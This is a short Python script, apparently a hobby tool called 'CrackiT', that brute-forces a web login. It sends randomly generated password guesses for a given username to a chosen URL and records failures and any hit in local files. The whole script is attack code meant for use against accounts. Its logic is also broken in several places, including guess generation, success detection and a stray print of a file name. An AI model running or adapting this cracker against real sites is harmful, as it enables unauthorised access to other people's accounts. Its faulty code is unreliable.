import subprocess
import requests
import random
from threading import Thread
import os

def name():
    subprocess.run('figlet "CrackiT" | lolcat', shell=True)

name()

passwordfile = open("password.txt", "r")
url = input("$: Url : ")
username = input("$: UserName / Mail / PhoneNumber : ")

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }

    r = requests.get(url, data=data)
    return r


chars = passwordfile.read()
def main():
    while True: 
        response = requests.get(url)
        if "correct_pass.txt" in os.listdir():
            break
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=2)
            passwd = "".join(rndpasswd)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True
            
        r = send_request(username, passwd)
        
        if response.status_code == 401:       
         if 'failed to login' in r.text.lower():
            with open("tries.txt", "a") as f:
                f.write(f"{passwd}\n")
                f.close()
            print(f"*:Incorrect {passwd}\n")
         else:
            print("*:Cracking Password ...")
            with open("correct_pass.txt", "w") as f:
                f.write(passwd)
                print("correct_pass.txt", "r")
                if response.status_code == 200:
                   print("Password Cracked !")
                   break
for _ in range(1):
    Thread(target=main).start()                   
    
